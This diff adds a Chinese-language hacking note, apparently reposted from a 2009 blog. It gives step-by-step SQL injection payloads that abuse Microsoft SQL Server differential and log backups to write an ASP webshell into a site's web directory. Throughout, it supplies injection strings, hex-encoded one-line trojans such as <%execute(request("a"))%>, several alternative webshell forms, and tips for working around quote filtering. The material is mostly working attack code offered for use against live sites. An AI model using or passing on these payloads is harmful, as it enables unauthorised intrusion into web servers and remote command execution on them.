@@ -1,0 +1,72 @@
+
+差异备份的主要代码：
+　　;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x626273 backup database @a to disk=@s--
+　　;Drop table [heige];create table [dbo].[heige] ([cmd] [image])--
+　　;insert into heige(cmd) values(0x3C2565786563757465207265717565737428226C2229253E)--
+　　;declare @a sysname,@s varchar(4000) select @a=db_name(),@s=0x643A5C7765625C312E617370 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT--
+　　这段代码中，0x626273是要备份的库名bbs的十六进制，可以是其他名字比如bbs.bak; 0x3C2565786563757465207265717565737428226C2229253E是＜%execute request("l")%＞的十六进制，是lp最小马；0x643A5C7765625C312E617370是d:\web\1.asp的十六进制,也就是你要备份的webshell路径。
+
+
+
+
+
+mssql差异备份获得的webshell 发布:独自等待 | 发布时间: 2009年4月22日
+
+MSSQL差异备份，就是和前一次备份作对比，把不一样的内容备份下来，这样，只要前一次备份后，插入新的内容，差异备份就可以把刚插入的内容备份出来，而这个备份文件将大大减少,得到webShell的成功也提高了不少！
+差异备份的流程大概这样：
+1.完整备份一次(保存位置当然可以改)
+backup database 库名 to disk = 'c:\ddd.bak';--
+2.创建表并插曲入数据
+create table [dbo].[dtest] ([cmd] [image]);
+insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E);--
+3.进行差异备份
+backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--
+上面
+0x3C25657865637574652872657175657374282261222929253E
+就是一句话木马的内容：<%execute(request("a"))%>
+
+如下是网上常见的差异备份代码，思路一样！
+===================================================
+利用差异备份提高提高backupwebshell的成功率,减少文件大小
+步骤:
+declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x77006F006B0061006F002E00620061006B00 backup database @a to disk=@s
+create table [dbo].[xiaolu] ([cmd] [image]);
+insert into xiaolu(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
+declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000 backup database @a to disk=@s WITH DIFFERENTIAL,FORMAT
+0x77006F006B0061006F002E00620061006B00为wokao.bak
+0x3C25657865637574652872657175657374282261222929253E是<%execute(request("a"))%>
+0x65003A005C007700650062005C0077006F006B0061006F002E00610073007000是e:\web\wokao.asp
+声明：方法不是我想的，我只是写工具，默认得到shell是
+<%execute(request("a"))%>
+===============================================================
+我发现上面代码，有时会无效，而直接用
+backup database 库名 to disk = 'c:\ddd.bak'
+create table [dbo].[dtest] ([cmd] [image]);
+insert into dtest(cmd) values(0x3C25657865637574652872657175657374282261222929253E)
+backup database 库名 to disk='目标位置\d.asp' WITH DIFFERENTIAL,FORMAT;--
+却可以成功，所以把最原始的方法写出来！思路是前人所创,这不说大家也知道的！
+库名 必须要有效的库名，一般注入工具都可以得到！如果某站过滤 "‘",就要把字符内容转为数值了！
+ 
+ 
+网上还有log增量备份的，我也把他记录一下
+=====================================================
+另一种log增量备份技术:
+';alter database null set RECOVERY FULL--
+';create table cmd (a image)--
+';backup log null to disk = 'f:\cmd' with init--
+';insert into cmd (a) values (0x3C2565786563757465287265717565737428226122292
+9253EDA)--
+';backup log null to disk = '备份路径'--
+PS:0x3C2565786563757465287265717565737428226122292
+9253EDA 是一句话小马16进制转来的
+说到一句话马，还可以有这么几种写法：
+a).<%%25Execute(request("a"))%%25>
+b).<%Execute(request("a"))%>
+c).%><%execute request("a")%><%
+d).<script language=VBScript runat=server>execute request("a")</script>
+e).<%25Execute(request("a"))%25>
+本文来源于独自等待博客：http://www.waitalone.cn/ 原文地址：http://www.waitalone.cn/post/179.html 
+
+
+
+
